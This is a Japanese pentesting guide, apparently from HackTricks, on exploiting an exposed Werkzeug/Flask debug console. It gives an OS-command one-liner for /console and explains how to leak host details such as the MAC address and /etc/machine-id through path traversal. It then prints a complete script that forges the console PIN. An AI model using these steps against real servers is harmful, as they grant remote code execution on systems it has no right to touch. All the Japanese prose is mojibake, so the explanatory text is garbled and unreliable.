# Werkzeug / Flask ãƒ‡ãƒãƒƒã‚°

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference es un evento internacional de ciberseguridad**](https://www.dragonjarcon.org/)ã¯ã€2023å¹´9æœˆ7æ—¥ã‹ã‚‰8æ—¥ã¾ã§ã‚³ãƒ­ãƒ³ãƒ“ã‚¢ã®ãƒœã‚´ã‚¿ã§é–‹å‚¬ã•ã‚Œã‚‹ã€10å¹´ä»¥ä¸Šã®æ­´å²ã‚’æŒã¤å›½éš›çš„ãªã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ™ãƒ³ãƒˆã§ã™ã€‚ã“ã®ã‚¤ãƒ™ãƒ³ãƒˆã¯ã€ã‚¹ãƒšã‚¤ãƒ³èªã§æœ€æ–°ã®ç ”ç©¶ãŒç™ºè¡¨ã•ã‚Œã‚‹æŠ€è¡“çš„ãªå†…å®¹ã®é«˜ã„ã‚¤ãƒ™ãƒ³ãƒˆã§ã‚ã‚Šã€ä¸–ç•Œä¸­ã®ãƒãƒƒã‚«ãƒ¼ã‚„ç ”ç©¶è€…ã‚’æƒ¹ãã¤ã‘ã¦ã„ã¾ã™ã€‚\
ä»¥ä¸‹ã®ãƒªãƒ³ã‚¯ã§ä»Šã™ãç™»éŒ²ã—ã€ã“ã®ç´ æ™´ã‚‰ã—ã„ã‚«ãƒ³ãƒ•ã‚¡ãƒ¬ãƒ³ã‚¹ã‚’ãŠè¦‹é€ƒã—ãªãï¼:

{% embed url="https://www.dragonjarcon.org" %}

## ã‚³ãƒ³ã‚½ãƒ¼ãƒ« RCE

ãƒ‡ãƒãƒƒã‚°ãŒæœ‰åŠ¹ãªå ´åˆã€`/console` ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ RCE ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã«ã¯ã€[ã“ã¡ã‚‰ã®](https://github.com/its-arun/Werkzeug-Debug-RCE)ã‚ˆã†ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚„Metasploitã®ã‚‚ã®ãªã©ã€ã„ãã¤ã‹ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆãŒå­˜åœ¨ã—ã¾ã™ã€‚

## ãƒ”ãƒ³ä¿è­· - ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«

å ´åˆã«ã‚ˆã£ã¦ã¯ã€**`/console`** ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆãŒãƒ”ãƒ³ã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ãƒ•ã‚¡ã‚¤ãƒ«ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã®è„†å¼±æ€§ãŒã‚ã‚‹å ´åˆã€ãã®ãƒ”ãƒ³ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«å¿…è¦ãªã™ã¹ã¦ã®æƒ…å ±ã‚’æ¼æ´©ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### Werkzeugã‚³ãƒ³ã‚½ãƒ¼ãƒ«PINã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ

**æœ€åˆã®ãƒªãƒ³ã‚¯ã‹ã‚‰ã‚³ãƒ”ãƒ¼ã€‚**\
ã‚¢ãƒ—ãƒªå†…ã§ãƒ‡ãƒãƒƒã‚°ã‚¨ãƒ©ãƒ¼ãƒšãƒ¼ã‚¸ã‚’å¼·åˆ¶çš„ã«è¡¨ç¤ºã™ã‚‹ã“ã¨ã§ã€Werkzeugã®ã€Œã‚³ãƒ³ã‚½ãƒ¼ãƒ«ãƒ­ãƒƒã‚¯ã•ã‚Œã¾ã—ãŸã€ã¨ã„ã†ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’ç¢ºèªã—ã¾ã™ã€‚
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
è„†å¼±ãªWerkzeugãƒ‡ãƒãƒƒã‚°ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã‚’`vulnerable-site.com/console`ã®ãƒ‘ã‚¹ã§è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ãŸã ã—ã€ãã‚Œã¯ç§˜å¯†ã®PINç•ªå·ã§ãƒ­ãƒƒã‚¯ã•ã‚Œã¦ã„ã¾ã™ã€‚

ã‚³ãƒ³ã‚½ãƒ¼ãƒ«PINã‚’ç”Ÿæˆã™ã‚‹ã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã‚’é€†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã‚µãƒ¼ãƒãƒ¼ä¸Šã®Werkzeugã®ãƒ‡ãƒãƒƒã‚°`__init__.py`ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª¿æŸ»ã—ã¦ãã ã•ã„ã€‚ä¾‹ãˆã°ã€`python3.5/site-packages/werkzeug/debug/__init__.py`ã§ã™ã€‚[**Werkzeugã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py)ã‚’è¡¨ç¤ºã—ã¦ã€**PINãŒç”Ÿæˆã•ã‚Œã‚‹æ–¹æ³•**ã‚’ç¢ºèªã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ãŒã€ãƒãƒ¼ã‚¸ãƒ§ãƒ³ãŒç•°ãªã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã€**ãƒ•ã‚¡ã‚¤ãƒ«ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã®è„†å¼±æ€§**ã‚’ä»‹ã—ã¦ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’æ¼æ´©ã•ã›ã‚‹æ–¹ãŒè‰¯ã„ã§ã—ã‚‡ã†ã€‚

ã‚³ãƒ³ã‚½ãƒ¼ãƒ«PINã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«å¿…è¦ãªå¤‰æ•°ï¼š
```python
probably_public_bits = [
username,
modname,
getattr(app, '__name__', getattr(app.__class__, '__name__')),
getattr(mod, '__file__', None),
]

private_bits = [
str(uuid.getnode()),
get_machine_id(),
]
```
#### **`probably_public_bits`**

* **`username`** ã¯ã“ã®Flaskã‚’èµ·å‹•ã—ãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã™ã€‚
* **`modname`** ã¯ flask.app ã§ã™ã€‚
* `getattr(app, '__name__', getattr (app .__ class__, '__name__'))` ã¯ **Flask** ã§ã™ã€‚
* `getattr(mod, '__file__', None)` ã¯ flaskãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªå†…ã® `app.py` ã® **çµ¶å¯¾ãƒ‘ã‚¹** ã§ã™ï¼ˆä¾‹ï¼š`/usr/local/lib/python3.5/dist-packages/flask/app.py`ï¼‰ã€‚`app.py` ãŒæ©Ÿèƒ½ã—ãªã„å ´åˆã¯ã€**`app.pyc`** ã‚’è©¦ã—ã¦ãã ã•ã„ã€‚

#### `private_bits`

* `uuid.getnode()` ã¯ç¾åœ¨ã®ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã® **MACã‚¢ãƒ‰ãƒ¬ã‚¹** ã§ã™ã€‚`str(uuid.getnode())` ã¯MACã‚¢ãƒ‰ãƒ¬ã‚¹ã®10é€²è¡¨ç¾ã§ã™ã€‚

* **ã‚µãƒ¼ãƒãƒ¼ã®MACã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¦‹ã¤ã‘ã‚‹**ã«ã¯ã€ã‚¢ãƒ—ãƒªã‚’æä¾›ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ **ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ãŒã©ã‚Œã‹ã‚’çŸ¥ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ï¼ˆä¾‹ï¼š`ens3`ï¼‰ã€‚ä¸æ˜ãªå ´åˆã¯ã€ãƒ‡ãƒã‚¤ã‚¹IDã®ãŸã‚ã« `/proc/net/arp` ã‚’ **æ¼æ´©** ã—ã€ãã®å¾Œ **`/sys/class/net/<device id>/address`** ã§MACã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ **æ¼æ´©** ã—ã¾ã™ã€‚

16é€²ã‚¢ãƒ‰ãƒ¬ã‚¹ã‹ã‚‰10é€²è¡¨ç¾ã«å¤‰æ›ã™ã‚‹ã«ã¯ã€Pythonã§æ¬¡ã®ã‚ˆã†ã«å®Ÿè¡Œã—ã¾ã™ã€‚

```python
# It was 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```

* `get_machine_id()` ã¯ `/etc/machine-id` ã®å€¤ã€`/proc/sys/kernel/random/boot_id` ã®å€¤ã€ãŠã‚ˆã³ `/proc/self/cgroup` ã®æœ€å¾Œã®ã‚¹ãƒ©ãƒƒã‚·ãƒ¥ï¼ˆ`/`ï¼‰ã®å¾Œã®æœ€åˆã®è¡Œã®å€¤ã‚’é€£çµã—ã¾ã™ã€‚

<details>

<summary>get_machine_id() ã‚³ãƒ¼ãƒ‰</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

ã™ã¹ã¦ã®å¤‰æ•°ã‚’æº–å‚™ã—ãŸã‚‰ã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã—ã¦Werkzeugã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã®PINã‚’ç”Ÿæˆã—ã¾ã™ã€‚
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',# username
'flask.app',# modname
'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
{% hint style="success" %}
Werkzeugã®**å¤ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³**ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã¯ã€md5ã§ã¯ãªã**md5ãƒãƒƒã‚·ãƒ¥ã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ **ã«å¤‰æ›´ã—ã¦ã¿ã¦ãã ã•ã„ã€‚
{% endhint %}

## å‚è€ƒæ–‡çŒ®

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference es un evento internacional de ciberseguridad**](https://www.dragonjarcon.org/)ã¯ã€ã‚³ãƒ­ãƒ³ãƒ“ã‚¢ã®ãƒœã‚´ã‚¿ã§2023å¹´9æœˆ7æ—¥ã‹ã‚‰8æ—¥ã¾ã§é–‹å‚¬ã•ã‚Œã‚‹ã€10å¹´ä»¥ä¸Šã®æ­´å²ã‚’æŒã¤å¤§è¦æ¨¡ãªæŠ€è¡“ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®ã‚¤ãƒ™ãƒ³ãƒˆã§ã™ã€‚ã“ã®ã‚¤ãƒ™ãƒ³ãƒˆã§ã¯ã€ã‚¹ãƒšã‚¤ãƒ³èªã§ã®æœ€æ–°ã®ç ”ç©¶ãŒç™ºè¡¨ã•ã‚Œã€ä¸–ç•Œä¸­ã®ãƒãƒƒã‚«ãƒ¼ã‚„ç ”ç©¶è€…ãŒé›†ã¾ã‚Šã¾ã™ã€‚\
ä»¥ä¸‹ã®ãƒªãƒ³ã‚¯ã‹ã‚‰ä»Šã™ãç™»éŒ²ã—ã€ã“ã®ç´ æ™´ã‚‰ã—ã„ã‚«ãƒ³ãƒ•ã‚¡ãƒ¬ãƒ³ã‚¹ã‚’ãŠè¦‹é€ƒã—ãªãï¼:

{% embed url="https://www.dragonjarcon.org" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
